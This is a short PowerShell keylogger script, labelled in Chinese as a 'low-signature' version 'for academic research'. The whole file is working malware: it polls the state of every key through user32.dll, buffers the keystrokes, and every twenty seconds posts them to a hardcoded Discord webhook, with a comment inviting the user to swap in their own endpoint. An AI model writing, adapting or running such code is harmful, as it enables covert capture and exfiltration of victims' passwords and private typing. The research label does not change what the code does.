# 學術研究用 keylogger.ps1 - 低特徵版本
Add-Type -AssemblyName System.Windows.Forms

$webhook = "https://discord.com/api/webhooks/1472107208023081128/RfuzPLMYCYA8XXwTaMQUcWg_VU_TULRl6Lh_sJm1LJW-MyMEDh-ThCZW-_iH-ZD8B77K
"  # 替換為您的 Discord Webhook 或自建端點
$logBuffer = ""
$lastSend = Get-Date

$API = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
Add-Type -MemberDefinition $API -Name Keyboard -Namespace API

function Send-Log {
    if ($logBuffer.Length -gt 0) {
        $payload = @{ content = "Log: $logBuffer" } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
        $script:logBuffer = ""
    }
}

while ($true) {
    Start-Sleep -Milliseconds 15
    for ($key = 8; $key -le 254; $key++) {
        if ([API.Keyboard]::GetAsyncKeyState($key) -eq -32767) {
            $char = [char]$key
            switch ($key) {
                8  { $char = "[BKSP]" }
                9  { $char = "[TAB]" }
                13 { $char = "[ENT]" }
                27 { $char = "[ESC]" }
                32 { $char = " " }
                160 { $char = "[LSHIFT]" }
                161 { $char = "[RSHIFT]" }
            }
            $logBuffer += $char
        }
    }

    if ((Get-Date) - $lastSend -gt [TimeSpan]::FromSeconds(20)) {
        Send-Log
        $lastSend = Get-Date
    }
}
